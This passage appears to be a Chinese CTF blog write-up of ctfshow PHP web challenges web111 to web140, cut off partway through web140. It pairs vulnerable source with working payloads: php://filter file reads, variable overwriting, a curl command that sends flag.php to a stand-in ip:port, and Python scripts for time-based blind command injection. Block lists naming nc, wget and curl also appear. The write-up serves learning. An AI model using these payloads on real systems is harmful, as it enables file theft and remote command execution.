class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/'</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/ctfshow/'</span>, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//变量覆盖+GLOBALS全局变量</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hacker!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hacker!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用php伪协议，过滤rot13，string，base64，可以用base16或者base32等绕过</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base16-encode/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.icnov.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hacker!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filter过滤器被过滤，伪协议用不了了</p><p>这里主要是要绕过<code>is_file()</code>这个php的内置函数</p><p>这里查阅资料可以构造软链接，超过二十次就可以绕过<code>is_file</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">    非预期</span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span>,$file))&#123;<span class="comment">//禁用了convert，data等，但是放出了filter，不编码格式直接读</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($num)</span></span>&#123;</span><br><span class="line">    $num=str_replace(<span class="string">"0x"</span>,<span class="string">"1"</span>,$num);<span class="comment">//十六进制被禁</span></span><br><span class="line">    $num=str_replace(<span class="string">"0"</span>,<span class="string">"1"</span>,$num);<span class="comment">//八进制被禁</span></span><br><span class="line">    $num=str_replace(<span class="string">"."</span>,<span class="string">"1"</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">"e"</span>,<span class="string">"1"</span>,$num);<span class="comment">//科学计数法</span></span><br><span class="line">    $num=str_replace(<span class="string">"+"</span>,<span class="string">"1"</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">'36'</span> <span class="keyword">and</span> trim($num)!==<span class="string">'36'</span> <span class="keyword">and</span> filter($num)==<span class="string">'36'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">'36'</span>)&#123;<span class="comment">//trim()过滤空格以及\n\r\t\v\0,不过滤\f</span></span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>转义字符绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=%<span class="number">0</span>c36<span class="comment">//%0c==\f</span></span><br></pre></td></tr></table></figure><h3 id="web123-126"><a href="#web123-126" class="headerlink" title="web123-126"></a>web123-126</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.freebuf.com/articles/web/213359.html</span></span><br><span class="line">register_argc_argv里面的trick(p神知识星球有讲)</span><br><span class="line">php字符串解析特性</span><br><span class="line"><span class="comment">#123 </span></span><br><span class="line">POST: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="keyword">echo</span> $flag </span><br><span class="line"></span><br><span class="line"><span class="comment">#125 </span></span><br><span class="line">GET:?<span class="number">1</span>=flag.php POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[<span class="number">1</span>]) </span><br><span class="line"></span><br><span class="line"><span class="comment">#126 </span></span><br><span class="line">GET:?a=<span class="number">1</span>+fl0g=flag_give_me POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php字符串解析特性</span><br><span class="line">GET:?ctf%<span class="number">20</span>show=ilove36d</span><br><span class="line">https:<span class="comment">//www.freebuf.com/articles/web/213359.html</span></span><br><span class="line">ctf%<span class="number">20</span>show==&gt;ctf_show</span><br></pre></td></tr></table></figure><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$f1 = $_GET[<span class="string">'f1'</span>];</span><br><span class="line">$f2 = $_GET[<span class="string">'f2'</span>];</span><br><span class="line"><span class="keyword">if</span>(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"嗯哼？"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">'/[0-9]|[a-z]/i'</span>, $str);</span><br><span class="line">&#125;<span class="comment">//check函数限制了能够使用的php函数，这里也就要用骚操作</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.php.net/manual/zh/book.gettext.php</span></span><br><span class="line">php手册中讲到的gettext()函数有个拓展函数_(),刚好能绕过check函数的检测</span><br><span class="line">payload</span><br><span class="line">f1=_&amp;f2=get_defined_vars  <span class="comment">#get_defined_vars()能够获取所有已定义变量组成的的数组</span></span><br></pre></td></tr></table></figure><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line">    $f = $_GET[<span class="string">'f'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos($f, <span class="string">'ctfshow'</span>)&gt;<span class="number">0</span>)&#123;<span class="comment">//匹配字符串中的ctfshow，且不能在起始位置</span></span><br><span class="line">        <span class="keyword">echo</span> readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到<code>readfile</code>函数，想到了路径穿越来读取flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">GET:?f=/ctfshow/../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><h3 id="web130-131"><a href="#web130-131" class="headerlink" title="web130-131"></a>web130-131</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_match正则回溯溢出</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">f=a*<span class="number">99999999</span>ctfshow</span><br><span class="line">f=a*<span class="number">9999999936</span>Dctfshow</span><br></pre></td></tr></table></figure><p>好像130可以直接绕过正则匹配，还得再看看</p><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>扫到<code>robots.txt</code>，访问<code>/admin</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $username = (String)$_GET[<span class="string">'username'</span>];</span><br><span class="line">    $password = (String)$_GET[<span class="string">'password'</span>];</span><br><span class="line">    $code = (String)$_GET[<span class="string">'code'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($code === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; $password === $flag || $username ===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($code == <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>&amp;&amp;</code>前面为假即为假，<code>||</code>前面为真即为真</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:?username=admin&amp;password=&amp;code=admin</span><br></pre></td></tr></table></figure><h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">'F'</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/system|nc|wget|exec|passthru|netcat/i'</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"6个字母都还不够呀?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可以变量覆盖，传入本身执行命令</span></span><br><span class="line">payload:</span><br><span class="line">?F=`$F`;%<span class="number">20</span>curl -X POST -F <span class="string">'file=@flag.php;filename=xx'</span> ip:port</span><br><span class="line">关于curl命令 http:<span class="comment">//www.ruanyifeng.com/blog/2019/09/curl-reference.html</span></span><br></pre></td></tr></table></figure><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key1'</span>]) || <span class="keyword">isset</span>($_GET[<span class="string">'key2'</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">'key1'</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">'key2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"nonononono"</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key1 == <span class="string">'36d'</span> &amp;&amp; $key2 == <span class="string">'36d'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">'flag.php'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br></pre></td></tr></table></figure><p><code>curl</code>被过滤了，这里发现可以改名来访问，用<code>mv</code>命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F `;mv flag.php xx.txt</span><br></pre></td></tr></table></figure><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">linux=&gt;tee Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</span><br><span class="line">?c=cat /f149_15_h3r3|tee xx</span><br></pre></td></tr></table></figure><h3 id="web137-138"><a href="#web137-138" class="headerlink" title="web137-138"></a>web137-138</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"private class"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//138多了下面的判断，没什么影响</span></span><br><span class="line"><span class="keyword">if</span>(strripos($_POST[<span class="string">'ctfshow'</span>], <span class="string">":"</span>)&gt;<span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"private function"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($_POST[<span class="string">'ctfshow'</span>]);</span><br></pre></td></tr></table></figure><p>内部类没办法直接调用，用到<code>call_user_func</code>调用内部类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()可以调用类内部的方法</span><br><span class="line">调用类内部的函数需要使用数组方式 <span class="keyword">array</span>(类名，方法名)</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">POST:ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</span><br></pre></td></tr></table></figure><h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'too young too simple sometimes naive!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反弹shell啥的都用不了，盲注，学习一波linux命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str = string.ascii_letters+string.digits+<span class="string">'_-'</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">print(str)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> str:</span><br><span class="line">            payload = <span class="string">"if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi"</span>.format(i,j,n)</span><br><span class="line">            url=<span class="string">"http://d25d2d7b-ff4a-4e83-ad28-3a0848cfed5e.chall.ctf.show/?c="</span>+payload</span><br><span class="line">            print(url)</span><br><span class="line">            start = time.time()</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            end = time.time()</span><br><span class="line">            <span class="keyword">if</span> (end - start) &gt; <span class="number">2</span>:</span><br><span class="line">                result += n</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    result += <span class="string">" "</span></span><br><span class="line"><span class="comment">#awk 'NR==1'自己Linux试试就知道了</span></span><br></pre></td></tr></table></figure><p>注出文件名后注flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str = string.ascii_letters+string.digits+<span class="string">'_-'</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">print(str)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> str:</span><br><span class="line">        payload = <span class="string">"if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi"</span>.format(j,n)</span><br><span class="line">        url = <span class="string">"http://d25d2d7b-ff4a-4e83-ad28-3a0848cfed5e.chall.ctf.show/?c="</span> + payload</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> (end-start) &gt; <span class="number">2</span>:</span><br><span class="line">            result += n</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'f1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'f2'</span>]))&#123;</span><br><span class="line">    $f1 = (String)$_POST[<span class="string">'f1'</span>];</span><br><span class="line">    $f2 = (String)$_POST[<span class="string">'f2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]+$/'</span>, $f1))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]+$/'</span>, $f2))&#123;</span><br><span class="line">            $code = <span class="keyword">eval</span>(<span class="string">"return $f1($f2());"</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval($code) == <span class="string">'ctfshow'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用php弱比较内部类型转换机制，只要让<code>$code</code>的值为0即可，利用<code>md5</code>值为非纯数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 